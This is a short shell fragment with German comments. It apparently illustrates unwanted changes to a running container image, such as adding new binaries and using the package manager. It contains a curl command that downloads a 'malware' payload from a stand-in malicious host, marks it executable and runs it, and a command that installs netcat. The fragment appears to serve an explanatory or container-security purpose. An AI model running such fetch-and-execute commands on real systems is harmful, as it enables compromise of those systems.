# Neue Binaries hinzufügen (nicht im Original-Image)
curl -o /tmp/malware http://malicious-site.com/payload
chmod +x /tmp/malware
/tmp/malware

# Package Manager verwenden
apt-get update && apt-get install -y netcat
